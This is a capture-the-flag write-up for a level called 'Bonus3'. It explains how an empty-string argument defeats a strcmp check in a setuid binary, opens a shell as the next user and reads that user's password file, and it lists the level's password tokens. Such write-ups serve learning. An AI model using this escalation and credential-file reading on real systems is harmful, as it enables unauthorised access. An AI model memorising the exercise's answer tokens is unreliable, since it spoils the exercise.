# Bonus3 - An easy one

## Local script usage

```shell
Usage: ./Ressources/main.sh
```

## Passwords and token

|        |                                                                    |
| ------ | ------------------------------------------------------------------ |
| bonus3 | `71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587` |
| end    | `3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c` |

## Steps to resolve on VM

Note: We will use `gdb-peda`. You can setup peda with the script: [scripts/installPeda.sh](../../scripts/installPeda.sh)

```shell
(gdb) info functions

0x080484f4  main
```

See our assembly interpretation in [source file](../source.c)

That is an easy one.

To be able to exec the shell, the readed buffer and the first argument have to be equals.

The first argument is converted as integer with `atoi`. This number ends the buffer with a NULL character at this number index.

We just have to put an empty string as argument.

```shell
  argv[1] = ""

=> n = atoi(argv[1]) = 0
=> buf[n] = '\0'

=> strcmp(buf, argv[1]) == 0
```

We can get the last pass !

```shell
~/bonus3 ""
$ whoami
  end
$ cat /home/user/end/.pass
  3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

## Sources

### ASM

- [What does the “rep stos” x86 assembly instruction sequence do?](https://stackoverflow.com/questions/3818856/what-does-the-rep-stos-x86-assembly-instruction-sequence-do)

### C

- [Man atoi](https://linux.die.net/man/3/atoi)
- [Man execl](https://linux.die.net/man/3/execl)
- [Man fclose](https://linux.die.net/man/3/fclose)
- [Man fopen](https://linux.die.net/man/3/fopen)
- [Man fread](https://linux.die.net/man/3/fread)
- [Man memset](https://linux.die.net/man/3/memset)
- [Man puts](https://linux.die.net/man/3/puts)
- [Man strcmp](https://linux.die.net/man/3/strcmp)
